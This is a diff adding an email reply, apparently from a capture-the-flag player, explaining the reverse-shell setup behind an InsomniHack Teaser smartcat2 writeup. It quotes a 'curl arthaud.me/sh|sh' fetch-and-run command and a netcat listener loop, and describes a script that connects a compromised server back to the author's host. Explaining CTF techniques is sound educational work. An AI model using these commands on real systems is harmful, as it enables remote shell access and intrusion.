@@ -1,0 +1,39 @@
+Hi John,
+
+> I just finished going through your smartcat2 writeup for the InsomniHack Teaser
+> (awesome work, by the way. I would never have thought to use the environment
+> variables as a way to execute shell commands.)
+
+Happy to help!
+
+
+> I've got a question as to how you got that real shell set up on your server. I
+> have my own server and I'd like to be able to replicate that same technique; do
+> you just have that '/sh' script on your domain, and you connect to it with that
+> `curl domainname/sh|sh` command? How does it differentiate between that "type"
+> or python2 or netcat? What other setup does it require?
+>
+> Just hoping you could give me a bit more of an explanation. Thanks so much!
+>
+> - John
+
+I have two things running on my server:
+
+* A web server (apache) with a simple "sh" file, so that anyone can access
+http://arthaud.me/sh
+* A tmux running "while true; do nc -v -l -p 8888; done"
+
+Running curl arthaud.me/sh|sh, it downloads my shell script at
+https://arthaud.me/sh and executes it. That scripts checks if python2 or netcat
+is available on the hacked server (using "if type python2", "if type nc"). if
+one of them is available, it uses it to connect to arthaud.me port 8888 and bind
+a shell on it. setid can also be used to detach the process from the current
+process.
+
+That way, by entering in my tmux (with tmux a) on my server, I have a real shell
+on the server. That is basically called a reverse bind shell:
+https://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/
+
+Tell me if I'm not clear.
+
+Cheers,
